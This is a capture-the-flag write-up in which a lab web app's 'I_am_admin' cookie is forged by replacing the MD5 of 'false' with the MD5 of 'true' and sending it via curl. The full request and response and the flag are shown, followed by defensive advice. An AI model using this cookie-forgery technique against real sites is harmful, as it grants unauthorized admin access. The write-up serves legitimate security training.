# Encrypted Admin Cookie


## Description

https://owasp.org/www-community/controls/SecureCookieAttribute

Here we have a non secure "admin" cookie (secure flag missing).
This cookies could be observed by unauthorized parties due to the transmission of the cookie in clear text.

## Attack

In the cookies we find I_am_admin 68934a3e9455fa72420237eb05902327 (false encrypted with md5)
Let's try to send this cookie with true (encrypted with md5) => b326b5062b2f0e69046810717534cb09 with curl
We set up the ip in the attack.sh script

        $ sh attack.sh
        % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                        Dload  Upload   Total   Spent    Left  Speed
        0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 192.168.56.101:80...
        * Connected to 192.168.56.101 (192.168.56.101) port 80 (#0)
        > GET / HTTP/1.1
        > Host: 192.168.56.101
        > User-Agent: curl/7.79.1
        > Accept: */*
        > Cookie: I_am_admin=b326b5062b2f0e69046810717534cb09
        > 
        * Mark bundle as not supporting multiuse
        < HTTP/1.1 200 OK
        < Server: nginx/1.4.6 (Ubuntu)
        < Date: Wed, 27 Jul 2022 09:25:15 GMT
        < Content-Type: text/html
        < Transfer-Encoding: chunked
        < Connection: keep-alive
        < X-Powered-By: PHP/5.5.9-1ubuntu4.29
        < 
        { [7014 bytes data]
        100  7001    0  7001    0     0   703k      0 --:--:-- --:--:-- --:--:-- 3418k
        * Connection #0 to host 192.168.56.101 left intact
        <script>alert('Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3'); </script><!DOCTYPE HTML>

Good job! Flag : df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3

## Defense

Add the secure cookie flag, by setting it, the browser will prevent the transmission of a cookie over an unencrypted channel
Don't put explicite variable names
Check admin access from backend for every request maybe with an access token